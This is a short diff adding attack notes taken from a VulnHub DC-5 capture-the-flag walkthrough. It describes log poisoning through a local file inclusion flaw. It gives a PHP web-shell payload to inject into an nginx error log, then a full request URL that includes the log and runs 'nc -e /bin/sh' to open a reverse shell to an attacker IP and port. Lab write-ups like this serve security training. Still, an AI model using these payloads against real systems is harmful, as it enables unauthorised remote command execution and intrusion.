@@ -1,0 +1,20 @@
+
+
+Ripped from a dc5 walkthrough
+
+https://github.com/mzfr/vulnhub-writeups/blob/master/2019-07-09-DC5.md
+
+    send the following in a request after your vulnrable paramater
+
+<?php system($_GET["cmd"]) ?>
+
+    find your log file (in this instance it was in /var/log/nginx/error.log)
+    append the following to a request to read the log file
+
+&cmd=nc -e /bin/sh IP-of-you-machine PORT
+
+full thing would look like so
+
+/thankyou.php?file=/var/log/nginx/error.log&cmd=nc -e /bin/sh 192.168.121.149 1337
+
+found it easier to test this in burp, but cna confirm this does work in browser too
